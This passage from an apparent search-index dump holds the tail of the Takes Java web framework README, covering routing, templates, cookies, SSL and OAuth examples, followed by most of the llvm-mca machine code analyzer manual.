TkWithType(new TkClasspath(), \"text/xsl\") ), new FkRegex(\"/account\", new TkAccount(users)), new FkRegex(\"/balance/(?<user>[a-z]+)\", new TkBalance()) ) ).start(Exit.NEVER); } } Front interface Essential part of Bigger Example is Front interface. It's encapsulates server's back-end and used to start an instance, which will accept requests and return results. FtBasic, which is a basic front, implements that interface - you've seen it's usage in above mentioned example. There are other useful implementations of this interface: The FtRemote class allows you to provide script, that will be executed against given front. You can see how it's used in integration tests. The FtCli class allows you to start your application with command line arguments. More details in Command Line Arguments. The FtSecure class allows you to start your application with SSL. More details in SSL Configuration. Back interface Back interface is the back-end that is responsible for IO operations on TCP network level. There are various useful implementations of that interface: The BkBasic class is a basic implementation of the Back interface. It is responsible for accepting the request from Socket, converting the socket's input to the Request, dispatching it to the provided Take instance, getting the result and printing it to the socket's output until all the request is fulfilled. The BkParallel class is a decorator of the Back interface, that is responsible for running the back-end in parallel threads. You can specify the number of threads or try to use the default number, which depends on available processors number in JVM. The BkSafe class is a decorator of the Back interface, that is responsible for running the back-end in a safe mode. That means that it will ignore exception thrown from original Back. The BkTimeable class is a decorator of the Back interface, that is responsible for running the back-end for specified maximum lifetime in milliseconds. It is constantly checking if the thread with original back exceeds provided limit and if so - it's interrupts the thread of that back. The BkWrap class is a convenient wrap over the original Back instance. It's just delegates the accept to that Back and might be useful if you want to add your own decorators of the Back interface. This class is used in BkParallel and BkSafe as a parent class. Templates Now let's see how we can render something more complex than an plain text. First, XML+XSLT is a recommended mechanism of HTML rendering. Even though it may be too complex, give it a try, you won't regret. Here is how we render a simple XML page that is transformed to HTML5 on-fly (more about RsXembly read below): public final class TkAccount implements Take { private final Users users; public TkAccount(final Users users) { this.users = users; } @Override public Response act(final Request req) { final User user = this.users.find(new RqCookies(req).get(\"user\")); return new RsLogin( new RsXSLT( new RsXembly( new XeStylesheet(\"/xsl/account.xsl\"), new XeAppend(\"page\", user) ) ), user ); } } This is how that User class may look like: public final class User implements XeSource { private final String name; private final int balance; @Override public Iterable<Directive> toXembly() { return new Directives().add(\"user\") .add(\"name\").set(this.name).up() .add(\"balance\").set(Integer.toString(this.balance)); } } Here is how RsLogin may look like: public final class RsLogin extends RsWrap { public RsLogin(final Response response, final User user) { super( new RsWithCookie( response, \"user\", user.toString() ) ); } } Velocity Templates Let's say, you want to use Velocity: public final class TkHelloWorld implements Take { @Override public Response act(final Request req) { return new RsVelocity( \"hi, ${user.name}! You've got ${user.balance}\", new RsVelocity.Pair(\"user\", new User()) ); } } You will need this extra dependency in classpath: <dependency> <groupId>org.apache.velocity</groupId> <artifactId>velocity-engine-core</artifactId> <scope>runtime</scope> </dependency> For Gradle users: dependencies { ... runtime group: 'org.apache.velocity', name: 'velocity-engine-core', version: 'x.xx'//put the version here ... } Static Resources Very often you need to serve static resources to your web users, like CSS stylesheets, images, JavaScript files, etc. There are a few supplementary classes for that: new TkFork( new FkRegex(\"/css/.+\", new TkWithType(new TkClasspath(), \"text/css\")), new FkRegex(\"/data/.+\", new TkFiles(new File(\"/usr/local/data\")) ) Class TkClasspath take static part of the request URI and finds a resource with this name in classpath. TkFiles just looks by file name in the directory configured. TkWithType sets content type of all responses coming out of the decorated take. Hit Refresh Debugging It is a very convenient feature. Once you start the app you want to be able to modify its static resources (CSS, JS, XSL, etc), refresh the page in a browser and immediately see the result. You don't want to re-compile the entire project and restart it. Here is what you need to do to your sources in order to enable that feature: new TkFork( new FkRegex( \"/css/.+\", new TkWithType( new TkFork( new FkHitRefresh( \"./src/main/resources/foo/scss/**\", // what sources to watch \"mvn sass:compile\", // what to run when sources are modified new TkFiles(\"./target/css\") ) new FkFixed(new TkClasspath()) ), \"text/css\" ) ) ) This FkHitRefresh fork is a decorator of take. Once it sees X-Take-Refresh header in the request, it realizes that the server is running in \"hit-refresh\" mode and passes the request to the encapsulated take. Before it passes the request it tries to understand whether any of the resources are older than compiled files. If they are older, it tries to run compilation tool to build them again. Request Methods (POST, PUT, HEAD, etc.) Here is an example: new TkFork( new FkRegex( \"/user\", new TkFork( new FkMethods(\"GET\", new TkGetUser()), new FkMethods(\"POST,PUT\", new TkPostUser()), new FkMethods(\"DELETE\", new TkDeleteUser()) ) ) ) Request Parsing Here is how you can parse an instance of Request: Href href = new RqHref.Base(request).href(); URI uri = href.uri(); Iterable<String> values = href.param(\"key\"); For a more complex parsing try to use Apache Http Client or something similar. Form Processing Here is an example: public final class TkSavePhoto implements Take { @Override public Response act(final Request req) { final String name = new RqForm(req).param(\"name\"); return new RsWithStatus(HttpURLConnection.HTTP_NO_CONTENT); } } Exception Handling By default, TkFork lets all exceptions bubble up. If one of your take crashes, a user will see a default error page. Here is how you can configure this behavior: public final class App { public static void main(final String... args) { new FtBasic( new TkFallback( new TkFork( new FkRegex(\"/robots\\\\.txt\", \"\"), new FkRegex(\"/\", new TkIndex()) ), new FbChain( new FbStatus(404, new RsText(\"sorry, page is absent\")), new FbStatus(405, new RsText(\"this method is not allowed here\")), new Fallback() { @Override public Iterator<Response> route(final RqFallback req) { return Collections.<Response>singleton( new RsHTML(\"oops, something went terribly wrong!\") ).iterator(); } } ) ), 8080 ).start(Exit.NEVER); } } TkFallback decorates an instance of Take and catches all exceptions any of its take may throw. Once it's thrown, an instance of FbChain will find the most suitable fallback and will fetch a response from there. Redirects Sometimes it's very useful to return a redirect response (30x status code), either by a normal return or by throwing an exception. This example illustrates both methods: public final class TkPostMessage implements Take { @Override public Response act(final Request req) { final String body = new RqPrint(req).printBody(); if (body.isEmpty()) { throw new RsForward( new RsFlash(\"message can't be empty\") ); } // save the message to the database return new RsForward( new RsFlash( \"thanks, the message was posted\" ), \"/\" ); } } Then, you should decorate the entire TkFork with this TkForward and TkFlash: public final class App { public static void main(final String... args) { new FtBasic( new TkFlash( new TkForward( new TkFork(new FkRegex(\"/\", new TkPostMessage()) ) ), 8080 ).start(Exit.NEVER); } } RsJSON Here is how we can deal with JSON: public final class TkBalance extends TkFixed { @Override public Response act(final RqRegex request) { return new RsJSON( new User(request.matcher().group(\"user\"))) ); } } This is the method to add to User: public final class User implements XeSource, RsJSON.Source { @Override public JsonObject toJSON() { return Json.createObjectBuilder() .add(\"balance\", this.balance) .build(); } } RsXembly Here is how you generate an XML page using Xembly: Response response = new RsXembly( new XeAppend(\"page\"), new XeDirectives(\"XPATH '/page'\", this.user) ) This is a complete example, with all possible options: Response response = new RsXembly( new XeStylesheet(\"/xsl/account.xsl\"), // add processing instruction new XeAppend( \"page\", // create a DOM document with \"page\" root element new XeMillis(false), // add \"millis\" attribute to the root, with current time user, // add user to the root element new XeSource() { @Override public Iterable<Directive> toXembly() { return new Directives().add(\"status\").set(\"alive\"); } }, new XeMillis(true), // replace \"millis\" attribute with take building time ), ) This is the output that will be produced: <?xml version='1.0'?> <?xsl-stylesheet href='/xsl/account.xsl'?> <page> <millis>5648</millis> <user> <name>Jeff Lebowski</name> <balance>123</balance> </user> <status>alive</status> </page> To avoid duplication of all this scaffolding in every page, you can create your own class, which will be used in every page, for example: Response response = new RsXembly( new XeFoo(user) ) This is how this XeFoo class would look like: public final class XeFoo extends XeWrap { public XeFoo(final String stylesheet, final XeSource... sources) { super( new XeAppend( \"page\", new XeMillis(false), new XeStylesheet(stylesheet), new XeChain(sources), new XeSource() { @Override public Iterable<Directive> toXembly() { return new Directives().add(\"status\").set(\"alive\"); } }, new XeMillis(true) ) ); } } You will need this extra dependency in classpath: <dependency> <groupId>com.jcabi.incubator</groupId> <artifactId>xembly</artifactId> </dependency> More about this mechanism in this blog post: XML Data and XSL Views in Takes Framework. Cookies Here is how we drop a cookie to the user: public final class TkIndex implements Take { @Override public Response act(final Request req) { return new RsWithCookie(\"auth\", \"John Doe\"); } } An HTTP response will contain this header, which will place a auth cookie into the user's browser: HTTP/1.1 200 OK Set-Cookie: auth=\"John Doe\" This is how you read cookies from a request: public final class TkIndex implements Take { @Override public Response act(final Request req) { // the list may be empty final Iterable<String> cookies = new RqCookies(req).cookie(\"my-cookie\"); } } GZIP Compression If you want to compress all your responses with GZIP, wrap your take in TkGzip: Now, each request that contains Accept-Encoding request header with gzip compression method inside will receive a GZIP-compressed response. Also, you can compress an individual response, using RsGzip decorator. Content Negotiation Say, you want to return different content based on Accept header of the request (a.k.a. content negotation): public final class TkIndex implements Take { @Override public Response act(final Request req) { return new RsFork( req, new FkTypes(\"text/*\", new RsText(\"it's a text\")) new FkTypes(\"application/json\", new RsJSON(\"{\\\"a\\\":1}\")) new FkTypes(\"image/png\", /* something else */) ); } } SSL Configuration First of all, setup your keystore settings, for example final String file = this.getClass().getResource(\"/org/takes/http/keystore\").getFile(); final String password = \"abc123\"; System.setProperty(\"javax.net.ssl.keyStore\", file); System.setProperty(\"javax.net.ssl.keyStorePassword\", password); System.setProperty(\"javax.net.ssl.trustStore\", file); System.setProperty(\"javax.net.ssl.trustStorePassword\", password); Then simple create exemplar of class FtSecure with socket factory final ServerSocket skt = SSLServerSocketFactory.getDefault().createServerSocket(0); new FtRemote( new FtSecure(new BkBasic(new TkFixed(\"hello, world\")), skt), skt, true ); Authentication Here is an example of login via Facebook: new TkAuth( new TkFork( new FkRegex(\"/\", new TkHTML(\"hello, check <a href='/acc'>account</a>\")), new FkRegex(\"/acc\", new TkSecure(new TkAccount())) ), new PsChain( new PsCookie( new CcSafe(new CcHex(new CcXOR(new CcCompact(), \"secret-code\"))) ), new PsByFlag( new PsByFlag.Pair( PsFacebook.class.getSimpleName(), new PsFacebook(\"facebook-app-id\", \"facebook-secret\") ), new PsByFlag.Pair( PsLogout.class.getSimpleName(), new PsLogout() ) ) ) ) Then, you need to show a login link to the user, which he or she can click and get to the Facebook OAuth authentication page. Here is how you do this with XeResponse: new RsXembly( new XeStylesheet(\"/xsl/index.xsl\"), new XeAppend( \"page\", new XeFacebookLink(req, \"facebook-app-id\"), // ... other xembly sources ) ) The link will be add to the XML page like this: <page> <links> <link rel=\"take:facebook\" href=\"https://www.facebook.com/dialog/oauth...\"/> </links> </page> Similar mechanism can be used for PsGithub, PsGoogle, PsLinkedin, PsTwitter, etc. This is how you get currently logged in user: public final class TkAccount implements Take { @Override public Response act(final Request req) { final Identity identity = new RqAuth(req).identity(); if (this.identity.equals(Identity.ANONYMOUS)) { // returns \"urn:facebook:1234567\" for a user logged in via Facebook this.identity().urn(); } } } More about it in this blog post: How Cookie-Based Authentication Works in the Takes Framework Command Line Arguments There is a convenient class FtCLI that parses command line arguments and starts the necessary Front accordingly. There are a few command line arguments that should be passed to FtCLI constructor: --port=1234 Tells the server to listen to TCP port 1234 --lifetime=5000 The server will die in five seconds (useful for integration testing) --hit-refresh Run the server in hit-refresh mode --daemon Runs the server in Java daemon thread (for integration testing) --threads=30 Processes incoming HTTP requests in 30 parallel threads --max-latency=5000 Maximum latency in milliseconds per each request (longer requests will be interrupted) For example: public final class App { public static void main(final String... args) { new FtCLI( new TkFork(new FkRegex(\"/\", \"hello, world!\")), args ).start(Exit.NEVER); } } Then, run it like this: $ java -cp take.jar App.class --port=8080 --hit-refresh You should see \"hello, world!\" at http://localhost:8080. Parameter --port also accepts file name, instead of a number. If the file exists, FtCLI will try to read its content and use it as port number. If the file is absent, FtCLI will allocate a new random port number, use it to start a server, and save it to the file. Logging The framework sends all logs to SLF4J logging facility. If you want to see them, configure one of SLF4J bindings. To make a Take log, wrap it in a TkSlf4j - for example: new TkSlf4j( new TkFork(...) ) Directory Layout You are free to use any build tool, but we recommend Maven. This is how your project directory layout may/should look like: /src /main /java /foo App.java /scss /coffeescript /resources /vtl /xsl /js /css robot.txt log4j.properties /test /java /foo AppTest.java /resources log4j.properties pom.xml LICENSE.txt Optional dependencies If you're using Maven and include Takes as a dependency in your own project, you can choose which of the optional dependencies to include in your project. The list of all of the optional dependencies can be seen in the Takes project pom.xml. For example, to use the Facebook API shown above, simply add a dependency to the restfb API in your project: <dependency> <groupId>com.restfb</groupId> <artifactId>restfb</artifactId> <version>1.15.0</version> <scope>runtime</scope> </dependency> For Gradle, you should add the dependencies as usual: dependencies { ... runtime group: 'com.restfb', name: 'restfb', version: '1.15.0' } Backward compatibility Version 2.0 is not backward compatible with previous versions. Version pattern for RESTful API The URL should NOT contain the versions, but the type requested. For example: ===> GET /architect/256 HTTP/1.1 Accept: application/org.takes.architect-v1+xml <=== HTTP/1.1 200 OK Content-Type: application/org.takes.architect-v1+xml <architect> <name>Yegor Bugayenko</name> </architect> Then clients aware of newer version of this service can call: ===> GET /architect/256 HTTP/1.1 Accept: application/org.takes.architect-v2+xml <=== HTTP/1.1 200 OK Content-Type: application/org.takes.architect-v2+xml <architect> <firstName>Yegor</firstName> <lastName>Bugayenko</lastName> <salutation>Mr.</salutation> </architect> This article explains why its done this way. How to contribute Fork repository, make changes, send us a pull request. We will review your changes and apply them to the master branch shortly, provided they don't violate our quality standards. To avoid frustration, before sending us your pull request please run full Maven build: $ mvn clean install -Pqulice To avoid build errors use maven 3.2+. Pay attention that our pom.xml inherits a lot of configuration from jcabi-parent. This article explains why it's done this way. Got questions? If you have questions or general suggestions, don't hesitate to submit a new Github issue. ",
        "_version_": 1718527412640153600
      },
      {
        "story_id": [19811709],
        "story_author": ["nkurz"],
        "story_descendants": [16],
        "story_score": [134],
        "story_time": ["2019-05-02T19:29:23Z"],
        "story_title": "Llvm-mca – LLVM Machine Code Analyzer",
        "search": [
          "Llvm-mca – LLVM Machine Code Analyzer",
          "https://llvm.org/docs/CommandGuide/llvm-mca.html",
          "SYNOPSIS llvm-mca [options] [input] DESCRIPTION llvm-mca is a performance analysis tool that uses information available in LLVM (e.g. scheduling models) to statically measure the performance of machine code in a specific CPU. Performance is measured in terms of throughput as well as processor resource consumption. The tool currently works for processors with a backend for which there is a scheduling model available in LLVM. The main goal of this tool is not just to predict the performance of the code when run on the target, but also help with diagnosing potential performance issues. Given an assembly code sequence, llvm-mca estimates the Instructions Per Cycle (IPC), as well as hardware resource pressure. The analysis and reporting style were inspired by the IACA tool from Intel. For example, you can compile code with clang, output assembly, and pipe it directly into llvm-mca for analysis: $ clang foo.c -O2 -target x86_64-unknown-unknown -S -o - | llvm-mca -mcpu=btver2 Or for Intel syntax: $ clang foo.c -O2 -target x86_64-unknown-unknown -mllvm -x86-asm-syntax=intel -S -o - | llvm-mca -mcpu=btver2 (llvm-mca detects Intel syntax by the presence of an .intel_syntax directive at the beginning of the input. By default its output syntax matches that of its input.) Scheduling models are not just used to compute instruction latencies and throughput, but also to understand what processor resources are available and how to simulate them. By design, the quality of the analysis conducted by llvm-mca is inevitably affected by the quality of the scheduling models in LLVM. If you see that the performance report is not accurate for a processor, please file a bug against the appropriate backend. OPTIONS If input is - or omitted, llvm-mca reads from standard input. Otherwise, it will read from the specified filename. If the -o option is omitted, then llvm-mca will send its output to standard output if the input is from standard input. If the -o option specifies -, then the output will also be sent to standard output. -help Print a summary of command line options. -o <filename> Use <filename> as the output filename. See the summary above for more details. -mtriple=<target triple> Specify a target triple string. -march=<arch> Specify the architecture for which to analyze the code. It defaults to the host default target. -mcpu=<cpuname> Specify the processor for which to analyze the code. By default, the cpu name is autodetected from the host. -output-asm-variant=<variant id> Specify the output assembly variant for the report generated by the tool. On x86, possible values are [0, 1]. A value of 0 (vic. 1) for this flag enables the AT&T (vic. Intel) assembly format for the code printed out by the tool in the analysis report. -print-imm-hex Prefer hex format for numeric literals in the output assembly printed as part of the report. -dispatch=<width> Specify a different dispatch width for the processor. The dispatch width defaults to field IssueWidth in the processor scheduling model. If width is zero, then the default dispatch width is used. -register-file-size=<size> Specify the size of the register file. When specified, this flag limits how many physical registers are available for register renaming purposes. A value of zero for this flag means unlimited number of physical registers. -iterations=<number of iterations> Specify the number of iterations to run. If this flag is set to 0, then the tool sets the number of iterations to a default value (i.e. 100). -noalias=<bool> If set, the tool assumes that loads and stores dont alias. This is the default behavior. -lqueue=<load queue size> Specify the size of the load queue in the load/store unit emulated by the tool. By default, the tool assumes an unbound number of entries in the load queue. A value of zero for this flag is ignored, and the default load queue size is used instead. -squeue=<store queue size> Specify the size of the store queue in the load/store unit emulated by the tool. By default, the tool assumes an unbound number of entries in the store queue. A value of zero for this flag is ignored, and the default store queue size is used instead. -timeline Enable the timeline view. -timeline-max-iterations=<iterations> Limit the number of iterations to print in the timeline view. By default, the timeline view prints information for up to 10 iterations. -timeline-max-cycles=<cycles> Limit the number of cycles in the timeline view, or use 0 for no limit. By default, the number of cycles is set to 80. -resource-pressure Enable the resource pressure view. This is enabled by default. -register-file-stats Enable register file usage statistics. -dispatch-stats Enable extra dispatch statistics. This view collects and analyzes instruction dispatch events, as well as static/dynamic dispatch stall events. This view is disabled by default. -scheduler-stats Enable extra scheduler statistics. This view collects and analyzes instruction issue events. This view is disabled by default. -retire-stats Enable extra retire control unit statistics. This view is disabled by default. -instruction-info Enable the instruction info view. This is enabled by default. -show-encoding Enable the printing of instruction encodings within the instruction info view. -all-stats Print all hardware statistics. This enables extra statistics related to the dispatch logic, the hardware schedulers, the register file(s), and the retire control unit. This option is disabled by default. -all-views Enable all the view. -instruction-tables Prints resource pressure information based on the static information available from the processor model. This differs from the resource pressure view because it doesnt require that the code is simulated. It instead prints the theoretical uniform distribution of resource pressure for every instruction in sequence. -bottleneck-analysis Print information about bottlenecks that affect the throughput. This analysis can be expensive, and it is disabled by default. Bottlenecks are highlighted in the summary view. Bottleneck analysis is currently not supported for processors with an in-order backend. -json Print the requested views in valid JSON format. The instructions and the processor resources are printed as members of special top level JSON objects. The individual views refer to them by index. However, not all views are currently supported. For example, the report from the bottleneck analysis is not printed out in JSON. All the default views are currently supported. -disable-cb Force usage of the generic CustomBehaviour and InstrPostProcess classes rather than using the target specific implementation. The generic classes never detect any custom hazards or make any post processing modifications to instructions. EXIT STATUS llvm-mca returns 0 on success. Otherwise, an error message is printed to standard error, and the tool returns 1. USING MARKERS TO ANALYZE SPECIFIC CODE BLOCKS llvm-mca allows for the optional usage of special code comments to mark regions of the assembly code to be analyzed. A comment starting with substring LLVM-MCA-BEGIN marks the beginning of a code region. A comment starting with substring LLVM-MCA-END marks the end of a code region. For example: # LLVM-MCA-BEGIN ... # LLVM-MCA-END If no user-defined region is specified, then llvm-mca assumes a default region which contains every instruction in the input file. Every region is analyzed in isolation, and the final performance report is the union of all the reports generated for every code region. Code regions can have names. For example: # LLVM-MCA-BEGIN A simple example add %eax, %eax # LLVM-MCA-END The code from the example above defines a region named A simple example with a single instruction in it. Note how the region name doesnt have to be repeated in the LLVM-MCA-END directive. In the absence of overlapping regions, an anonymous LLVM-MCA-END directive always ends the currently active user defined region. Example of nesting regions: # LLVM-MCA-BEGIN foo add %eax, %edx # LLVM-MCA-BEGIN bar sub %eax, %edx # LLVM-MCA-END bar # LLVM-MCA-END foo Example of overlapping regions: # LLVM-MCA-BEGIN foo add %eax, %edx # LLVM-MCA-BEGIN bar sub %eax, %edx # LLVM-MCA-END foo add %eax, %edx # LLVM-MCA-END bar Note that multiple anonymous regions cannot overlap. Also, overlapping regions cannot have the same name. There is no support for marking regions from high-level source code, like C or C++. As a workaround, inline assembly directives may be used: int foo(int a, int b) { __asm volatile(\"# LLVM-MCA-BEGIN foo\"); a += 42; __asm volatile(\"# LLVM-MCA-END\"); a *= b; return a; } However, this interferes with optimizations like loop vectorization and may have an impact on the code generated. This is because the __asm statements are seen as real code having important side effects, which limits how the code around them can be transformed. If users want to make use of inline assembly to emit markers, then the recommendation is to always verify that the output assembly is equivalent to the assembly generated in the absence of markers. The Clang options to emit optimization reports can also help in detecting missed optimizations. HOW LLVM-MCA WORKS llvm-mca takes assembly code as input. The assembly code is parsed into a sequence of MCInst with the help of the existing LLVM target assembly parsers. The parsed sequence of MCInst is then analyzed by a Pipeline module to generate a performance report. The Pipeline module simulates the execution of the machine code sequence in a loop of iterations (default is 100). During this process, the pipeline collects a number of execution related statistics. At the end of this process, the pipeline generates and prints a report from the collected statistics. Here is an example of a performance report generated by the tool for a dot-product of two packed float vectors of four elements. The analysis is conducted for target x86, cpu btver2. The following result can be produced via the following command using the example located at test/tools/llvm-mca/X86/BtVer2/dot-product.s: $ llvm-mca -mtriple=x86_64-unknown-unknown -mcpu=btver2 -iterations=300 dot-product.s Iterations: 300 Instructions: 900 Total Cycles: 610 Total uOps: 900 Dispatch Width: 2 uOps Per Cycle: 1.48 IPC: 1.48 Block RThroughput: 2.0 Instruction Info: [1]: #uOps [2]: Latency [3]: RThroughput [4]: MayLoad [5]: MayStore [6]: HasSideEffects (U) [1] [2] [3] [4] [5] [6] Instructions: 1 2 1.00 vmulps %xmm0, %xmm1, %xmm2 1 3 1.00 vhaddps %xmm2, %xmm2, %xmm3 1 3 1.00 vhaddps %xmm3, %xmm3, %xmm4 Resources: [0] - JALU0 [1] - JALU1 [2] - JDiv [3] - JFPA [4] - JFPM [5] - JFPU0 [6] - JFPU1 [7] - JLAGU [8] - JMul [9] - JSAGU [10] - JSTC [11] - JVALU0 [12] - JVALU1 [13] - JVIMUL Resource pressure per iteration: [0] [1] [2] [3] [4] [5] [6] [7] [8] [9] [10] [11] [12] [13] - - - 2.00 1.00 2.00 1.00 - - - - - - - Resource pressure by instruction: [0] [1] [2] [3] [4] [5] [6] [7] [8] [9] [10] [11] [12] [13] Instructions: - - - - 1.00 - 1.00 - - - - - - - vmulps %xmm0, %xmm1, %xmm2 - - - 1.00 - 1.00 - - - - - - - - vhaddps %xmm2, %xmm2, %xmm3 - - - 1.00 - 1.00 - - - - - - - - vhaddps %xmm3, %xmm3, %xmm4 According to this report, the dot-product kernel has been executed 300 times, for a total of 900 simulated instructions. The total number of simulated micro opcodes (uOps) is also 900. The report is structured in three main sections. The first section collects a few performance numbers; the goal of this section is to give a very quick overview of the performance throughput. Important performance indicators are IPC, uOps Per Cycle, and Block RThroughput (Block Reciprocal Throughput). Field DispatchWidth is the maximum number of micro opcodes that are dispatched to the out-of-order backend every simulated cycle. For processors with an in-order backend, DispatchWidth is the maximum number of micro opcodes issued to the backend every simulated cycle. IPC is computed dividing the total number of simulated instructions by the total number of cycles. Field Block RThroughput is the reciprocal of the block throughput. Block throughput is a theoretical quantity computed as the maximum number of blocks (i.e. iterations) that can be executed per simulated clock cycle in the absence of loop carried dependencies. Block throughput is superiorly limited by the dispatch rate, and the availability of hardware resources. In the absence of loop-carried data dependencies, the observed IPC tends to a theoretical maximum which can be computed by dividing the number of instructions of a single iteration by the Block RThroughput. Field uOps Per Cycle is computed dividing the total number of simulated micro opcodes by the total number of cycles. A delta between Dispatch Width and this field is an indicator of a performance issue. In the absence of loop-carried data dependencies, the observed uOps Per Cycle should tend to a theoretical maximum throughput which can be computed by dividing the number of uOps of a single iteration by the Block RThroughput. Field uOps Per Cycle is bounded from above by the dispatch width. That is because the dispatch width limits the maximum size of a dispatch group. Both IPC and uOps Per Cycle are limited by the amount of hardware parallelism. The availability of hardware resources affects the resource pressure distribution, and it limits the number of instructions that can be executed in parallel every cycle. A delta between Dispatch Width and the theoretical maximum uOps per Cycle (computed by dividing the number of uOps of a single iteration by the Block RThroughput) is an indicator of a performance bottleneck caused by the lack of hardware resources. In general, the lower the Block RThroughput, the better. In this example, uOps per iteration/Block RThroughput is 1.50. Since there are no loop-carried dependencies, the observed uOps Per Cycle is expected to approach 1.50 when the number of iterations tends to infinity. The delta between the Dispatch Width (2.00), and the theoretical maximum uOp throughput (1.50) is an indicator of a performance bottleneck caused by the lack of hardware resources, and the Resource pressure view can help to identify the problematic resource usage. The second section of the report is the instruction info view. It shows the latency and reciprocal throughput of every instruction in the sequence. It also reports extra information related to the number of micro opcodes, and opcode properties (i.e., MayLoad, MayStore, and HasSideEffects). Field RThroughput is the reciprocal of the instruction throughput. Throughput is computed as the maximum number of instructions of a same type that can be executed per clock cycle in the absence of operand dependencies. In this example, the reciprocal throughput of a vector float multiply is 1 cycles/instruction. That is because the FP multiplier JFPM is only available from pipeline JFPU1. Instruction encodings are displayed within the instruction info view when flag -show-encoding is specified. Below is an example of -show-encoding output for the dot-product kernel: Instruction Info: [1]: #uOps [2]: Latency [3]: RThroughput [4]: MayLoad [5]: MayStore [6]: HasSideEffects (U) [7]: Encoding Size [1] [2] [3] [4] [5] [6] [7] Encodings: Instructions: 1 2 1.00 4 c5 f0 59 d0 vmulps %xmm0, %xmm1, %xmm2 1 4 1.00 4 c5 eb 7c da vhaddps %xmm2, %xmm2, %xmm3 1 4 1.00 4 c5 e3 7c e3 vhaddps %xmm3, %xmm3, %xmm4 The Encoding Size column shows the size in bytes of instructions. The Encodings column shows the actual instruction encodings (byte sequences in hex). The third section is the Resource pressure view. This view reports the average number of resource cycles consumed every iteration by instructions for every processor resource unit available on the target. Information is structured in two tables. The first table reports the number of resource cycles spent on average every iteration. The second table correlates the resource cycles to the machine instruction in the sequence. For example, every iteration of the instruction vmulps always executes on resource unit [6] (JFPU1 - floating point pipeline #1), consuming an average of 1 resource cycle per iteration. Note that on AMD Jaguar, vector floating-point multiply can only be issued to pipeline JFPU1, while horizontal floating-point additions can only be issued to pipeline JFPU0. The resource pressure view helps with identifying bottlenecks caused by high usage of specific hardware resources. Situations with resource pressure mainly concentrated on a few resources should, in general, be avoided. Ideally, pressure should be uniformly distributed between multiple resources. Timeline View The timeline view produces a detailed report of each instructions state transitions through an instruction pipeline. This view is enabled by the command line option -timeline. As instructions transition through the various stages of the pipeline, their states are depicted in the view report. These states are represented by the following characters: D : Instruction dispatched. e : Instruction executing. E : Instruction executed. R : Instruction retired. = : Instruction already dispatched, waiting to be executed. - : Instruction executed, waiting to be retired. Below is the timeline view for a subset of the dot-product example located in test/tools/llvm-mca/X86/BtVer2/dot-product.s and processed by llvm-mca using the following command: $ llvm-mca -mtriple=x86_64-unknown-unknown -mcpu=btver2 -iterations=3 -timeline dot-product.s Timeline view: 012345 Index 0123456789 [0,0] DeeER. . . vmulps %xmm0, %xmm1, %xmm2 [0,1] D==eeeER . . vhaddps %xmm2, %xmm2, %xmm3 [0,2] .D====eeeER . vhaddps %xmm3, %xmm3, %xmm4 [1,0] .DeeE-----R . vmulps %xmm0, %xmm1, %xmm2 [1,1] . D=eeeE---R . vhaddps %xmm2, %xmm2, %xmm3 [1,2] . D====eeeER . vhaddps %xmm3, %xmm3, %xmm4 [2,0] . DeeE-----R . vmulps %xmm0, %xmm1, %xmm2 [2,1] . D====eeeER . vhaddps %xmm2, %xmm2, %xmm3 [2,2] . D======eeeER vhaddps %xmm3, %xmm3, %xmm4 Average Wait times (based on the timeline view): [0]: Executions [1]: Average time spent waiting in a scheduler's queue [2]: Average time spent waiting in a scheduler's queue while ready [3]: Average time elapsed from WB until retire stage [0] [1] [2] [3] 0. 3 1.0 1.0 3.3 vmulps %xmm0, %xmm1, %xmm2 1. 3 3.3 0.7 1.0 vhaddps %xmm2, %xmm2, %xmm3 2. 3 5.7 0.0 0.0 vhaddps %xmm3, %xmm3, %xmm4 3 3.3 0.5 1.4 <total> The timeline view is interesting because it shows instruction state changes during execution. It also gives an idea of how the tool processes instructions executed on the target, and how their timing information might be calculated. The timeline view is structured in two tables. The first table shows instructions changing state over time (measured in cycles); the second table (named Average Wait times) reports useful timing statistics, which should help diagnose performance bottlenecks caused by long data dependencies and sub-optimal usage of hardware resources. An instruction in the timeline view is identified by a pair of indices, where the first index identifies an iteration, and the second index is the instruction index (i.e., where it appears in the code sequence). Since this example was generated using 3 iterations: -iterations=3, the iteration indices range from 0-2 inclusively. Excluding the first and last column, the remaining columns are in cycles. Cycles are numbered sequentially starting from 0. From the example output above, we know the following: Instruction [1,0] was dispatched at cycle 1. Instruction [1,0] started executing at cycle 2. Instruction [1,0] reached the write back stage at cycle 4. Instruction [1,0] was retired at cycle 10. Instruction [1,0] (i.e., vmulps from iteration #1) does not have to wait in the schedulers queue for the operands to become available. By the time vmulps is dispatched, operands are already available, and pipeline JFPU1 is ready to serve another instruction. So the instruction can be immediately issued on the JFPU1 pipeline. That is demonstrated by the fact that the instruction only spent 1cy in the schedulers queue. There is a gap of 5 cycles between the write-back stage and the retire event. That is because instructions must retire in program order, so [1,0] has to wait for [0,2] to be retired first (i.e., it has to wait until cycle 10). In the example, all instructions are in a RAW (Read After Write) dependency chain. Register %xmm2 written by vmulps is immediately used by the first vhaddps, and register %xmm3 written by the first vhaddps is used by the second vhaddps. Long data dependencies negatively impact the ILP (Instruction Level Parallelism). In the dot-product example, there are anti-dependencies introduced by instructions from different iterations. However, those dependencies can be removed at register renaming stage (at the cost of allocating register aliases, and therefore consuming physical registers). Table Average Wait times helps diagnose performance issues that are caused by the presence of long latency instructions and potentially long data dependencies which may limit the ILP. Last row, <total>, shows a global average over all instructions measured. Note that llvm-mca, by default, assumes at least 1cy between the dispatch event and the issue event. When the performance is limited by data dependencies and/or long latency instructions, the number of cycles spent while in the ready state is expected to be very small when compared with the total number of cycles spent in the schedulers queue. The difference between the two counters is a good indicator of how large of an impact data dependencies had on the execution of the instructions. When performance is mostly limited by the lack of hardware resources, the delta between the two counters is small. However, the number of cycles spent in the queue tends to be larger (i.e., more than 1-3cy), especially when compared to other low latency instructions. Bottleneck Analysis The -bottleneck-analysis command line option enables the analysis of performance bottlenecks. This analysis is potentially expensive. It attempts to correlate increases in backend pressure (caused by pipeline resource pressure and data dependencies) to dynamic dispatch stalls. Below is an example of -bottleneck-analysis output generated by llvm-mca for 500 iterations of the dot-product example on btver2. Cycles with backend pressure increase [ 48.07% ] Throughput Bottlenecks: Resource Pressure [ 47.77% ] - JFPA [ 47.77% ] - JFPU0 [ 47.77% ] Data Dependencies: [ 0.30% ] - Register Dependencies [ 0.30% ] - Memory Dependencies [ 0.00% ] Critical sequence based on the simulation: Instruction Dependency Information +----< 2. vhaddps %xmm3, %xmm3, %xmm4 | | < loop carried > | | 0. vmulps %xmm0, %xmm1, %xmm2 +----> 1. 